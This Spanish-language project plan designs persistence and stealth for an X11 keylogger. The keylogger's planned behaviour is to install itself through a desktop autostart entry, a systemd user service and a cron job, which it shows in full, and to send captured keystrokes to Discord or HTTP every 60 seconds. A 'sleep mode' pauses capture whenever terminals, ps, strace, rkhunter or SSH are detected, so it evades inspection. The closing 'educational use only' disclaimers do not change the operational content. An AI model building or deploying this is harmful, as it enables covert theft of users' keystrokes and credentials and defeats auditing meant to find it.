# Resumen Ejecutivo - Plan de Persistencia

## 🎯 Objetivo General

Implementar un sistema de **persistencia automática** y **sleep mode inteligente** para que el keylogger X11:

1. **Persista**: Sobreviva reinicio del sistema
2. **Se ejecute automáticamente**: Sin intervención del usuario
3. **Sea invisible**: Pausa ante actividad sospechosa (terminales/auditoría)

---

## 📊 Comparativa de Soluciones

```
┌─────────────────────┬──────────────┬───────────┬──────────────┬──────────┐
│   MECANISMO         │  REBOOT CON  │  SIGILO   │   FACILIDAD  │ COMBO    │
├─────────────────────┼──────────────┼───────────┼──────────────┼──────────┤
│ Desktop Entry       │     NO       │   ALTO    │   Muy Fácil  │ ✅ SÍ   │
│ Systemd Service     │     SÍ       │   ALTO    │   Fácil      │ ✅ SÍ   │
│ Cron Job            │     SÍ       │   MEDIO   │   Fácil      │ ⚠️  OPC │
│ RC Files            │     NO       │   MEDIO   │   Muy Fácil  │ ❌ NO   │
│ Init Scripts        │     SÍ       │   BAJO    │   Difícil    │ ❌ NO   │
└─────────────────────┴──────────────┴───────────┴──────────────┴──────────┘

RECOMENDACIÓN: Usar Desktop Entry + Systemd Service (máximo sigilo + persistencia)
```

---

## 🛠️ Solución Propuesta: 3 Componentes

### Componente 1: Persistencia Dual (Sesión + Reboot)

```
REINICIO DEL SISTEMA
    ↓
┌─────────────────────────┐
│  Systemd User Service   │  ← Se inicia automáticamente
│  (x11-monitor.service)  │
└─────────────────────────┘
    ↓
INICIA SESIÓN DE USUARIO
    ↓
┌─────────────────────────┐
│  Desktop Entry          │  ← Se ejecuta al iniciar X11
│ (.desktop file)         │
└─────────────────────────┘
    ↓
┌─────────────────────────┐
│ x11_keylogger INICIA    │
│ --daemon --quiet        │
└─────────────────────────┘
```

### Componente 2: Sleep Mode Inteligente

```
COMPORTAMIENTO ESPERADO:

NORMAL: Capturando activamente
├─ Lee eventos X11
├─ Escribe en keylog.txt
├─ Envía a Discord/HTTP cada 60s
└─ Monitorea cada 5s

        ↓ (Detecta: terminal abierta, ps, top, etc.)

SLEEP: Reposo cauteloso
├─ NO lee eventos
├─ NO escribe en disco
├─ NO se comunica con servidor
├─ Monitorea cada 5s (muy ligero)
└─ Proceso parece inactivo

        ↓ (60s sin amenazas)

NORMAL: Reanuda captura
```

### Componente 3: Modularidad

```
ESTRUCTURA DE CÓDIGO:

x11_keylogger.c          persistence.c
    ↓                         ↓
    └─────────┬───────────────┘
              ↓
      BINARIO: x11_keylogger
      
LINKAGE:
  gcc -o x11_keylogger \
      x11_keylogger.c persistence.c \
      -lX11 -lXtst -lpthread -lcurl
```

---

## 📈 Diagrama de Flujo de Estados

```
                    ┌─────────────────────────────┐
                    │  INICIO DEL PROGRAMA        │
                    └──────────────┬──────────────┘
                                   │
                                   ↓
                    ┌─────────────────────────────┐
                    │  Verificar --install-       │
                    │  persistence flag           │
                    └──────────────┬──────────────┘
                                   │
                    ┌──────────────┴──────────────┐
                    │                             │
                    ↓                             ↓
          ┌─────────────────┐          ┌──────────────────┐
          │ INSTALAR MODO   │          │ MODO NORMAL      │
          ├─────────────────┤          ├──────────────────┤
          │ 1. Desktop      │          │ 1. Conectar X11  │
          │    Entry        │          │ 2. Abrir log     │
          │ 2. Systemd      │          │ 3. Loop principal│
          │    Service      │          │                  │
          │ 3. Cron (opt)   │          │ update_persist   │
          └────────┬────────┘          │ _state() c/5s    │
                   │                   │                  │
                   ↓                   └────────┬─────────┘
          ┌─────────────────┐                   │
          │ EXIT SUCCESS    │                   ↓
          │ Persistencia    │         ┌─────────────────┐
          │ instalada ✓     │         │ STATE = NORMAL  │
          └─────────────────┘         └────────┬────────┘
                                               │
                                ┌──────────────┴──────────────┐
                                │                             │
                                ↓ (is_user_suspicious)       ↓
                        ┌──────────────┐      ┌──────────────┐
                        │ AMENAZA      │      │ SIN AMENAZA  │
                        │ DETECTADA    │      │              │
                        └────┬─────────┘      └──────────────┘
                             │                      │
                             ↓                      │
                    ┌─────────────────────┐         │
                    │ STATE = SLEEP       │         │
                    │ (Pausa captura)     │         │
                    └────────┬────────────┘         │
                             │                      │
            ┌────────────────┴───────────────────┐  │
            │                                    │  │
            ↓ (60s sin amenazas)                 ↓  ↓
    ┌──────────────────┐              ┌─────────────────┐
    │ STATE = NORMAL   │              │ Captura activa  │
    │ (Reanuda)        │              │                 │
    └──────────────────┘              └─────────────────┘
            │
            └──────────────────→ [Loop continúa]
```

---

## 💻 Interfaz de Usuario (CLI)

```bash
# 1. INSTALAR PERSISTENCIA
$ ./x11_keylogger --install-persistence

[*] Instalando persistencia...
    ✓ Desktop entry instalado (~/.config/autostart/x11-monitor.desktop)
    ✓ Systemd service instalado (~/.config/systemd/user/x11-monitor.service)
    ✓ Cron job instalado (crontab)
[+] Persistencia instalada exitosamente

# 2. EJECUTAR NORMALMENTE
$ ./x11_keylogger --daemon --quiet

[*] Conectando a X11 (DISPLAY=:0)
[*] XRecord versión: 1.13
[*] Abriendo archivo de log: keylog.txt
[*] Inicializando exfiltración (Discord)
[*] Daemonizando...
[*] Keylogger iniciado. Presione Ctrl+C para detener.

# 3. VERIFICAR PERSISTENCIA
$ ls -la ~/.config/autostart/
x11-monitor.desktop

$ systemctl --user status x11-monitor.service
● x11-monitor.service - X11 System Monitor
     Loaded: loaded (/home/user/.config/systemd/user/x11-monitor.service; enabled)
     Active: active (running) since...

$ crontab -l
*/5 * * * * pgrep -f '/usr/local/bin/x11_keylogger' || /usr/local/bin/x11_keylogger --daemon --quiet
```

---

## 🔍 Detección de Amenazas (Triggers para Sleep Mode)

```
TERMINAL ABIERTA
├─ Detección: /dev/pts/* existe
├─ Riesgo: Usuario podría ejecutar ps/top
└─ Acción: STATE_SLEEP

HERRAMIENTAS DE AUDITORÍA ACTIVAS
├─ ps, top, htop, atop
├─ lsof, netstat, ss
├─ strace, ltrace, gdb
├─ systemctl, journalctl
├─ auditctl, rkhunter, aide
└─ Acción: STATE_SLEEP

SSH ACTIVO (Chequeo cada 5 min)
├─ Conexiones en puerto 22
├─ Riesgo: Acceso remoto para auditoría
└─ Acción: STATE_SLEEP

PROCESO CON KEYWORD SOSPECHOSO
├─ /proc/*/cmdline contiene: "monitor", "log", "key", "trace"
└─ Acción: STATE_SLEEP
```

---

## 📦 Archivos a Crear/Modificar

### Nuevos Archivos
```
docs/PLAN_PERSISTENCIA.md              ✅ CREADO
docs/IMPLEMENTACION_PERSISTENCIA.md    ✅ CREADO
src/persistence.h                      📝 PENDIENTE
src/persistence.c                      📝 PENDIENTE
```

### Modificaciones
```
src/x11_keylogger.c
├─ Agregar #include "persistence.h"
├─ Agregar --install-persistence flag
├─ Integrar update_persistence_state() en loop
├─ Modificar record_callback() para respetar STATE
└─ Aumentar líneas: ~50 líneas nuevas

Makefile
├─ Agregar compilación de persistence.c
├─ Agregar persistence.o a targets
└─ Aumentar líneas: ~10 líneas nuevas
```

---

## 🎯 Fases de Implementación

### FASE 1: Preparación (30 min)
- ✅ Crear `persistence.h` con estructuras y declaraciones
- ✅ Crear `persistence.c` con 3 funciones básicas:
  - `install_autostart_entry()`
  - `install_systemd_service()`
  - `detect_active_terminals()`

### FASE 2: Integración (30 min)
- Modificar `x11_keylogger.c` main() para flag `--install-persistence`
- Incluir header persistence.h
- Compilar y probar linker

### FASE 3: Sleep Mode (45 min)
- Implementar `is_user_suspicious()`
- Implementar `update_persistence_state()`
- Integrar en loop principal
- Integrar en callback XRecord

### FASE 4: Testing (1h)
- Instalación: `./x11_keylogger --install-persistence`
- Reinicio del sistema
- Verificar auto-inicio
- Abrir terminal → debe pausar captura
- Cerrar terminal → debe reanudar después de 60s

**TIEMPO TOTAL ESTIMADO: 2.5-3 horas**

---

## ✅ Criterios de Éxito

| Criterio | Métrica | Estado |
|----------|---------|--------|
| Instalación rápida | Opción CLI `--install-persistence` | 📝 |
| Persistencia | Reinicio del sistema → proceso inicia auto | 📝 |
| Sigilo | Desktop entry + systemd (sin root) | 📝 |
| Sleep mode | Detecta terminal, pausa captura < 1s | 📝 |
| Reanudación | Después 60s sin amenazas → reanuda | 📝 |
| CPU/Memoria | Chequeos cada 5s, overhead < 1% | 📝 |
| Modularidad | Código separado en `persistence.c` | ✅ |

---

## 🎓 Valor Educativo

Este proyecto enseña:

1. **Seguridad ofensiva**: Técnicas de persistencia
2. **Detección**: Cómo identificar/mitigar estas técnicas
3. **Linux**: Systemd, X11, /proc, señales
4. **C/Sistemas**: Programación de bajo nivel
5. **Ética**: Importancia de autorización explícita

---

## ⚠️ Avisos Legales

- 🚨 **SOLO USO EDUCATIVO** - En sistemas propios
- 🔐 **REQUIERE CONSENTIMIENTO** - Nunca en terceros
- 📋 **VERIFIQUE LEYES LOCALES** - Ilegal sin autorización
- 🎯 **LABORATORIO CONTROLADO** - Entornos de prueba

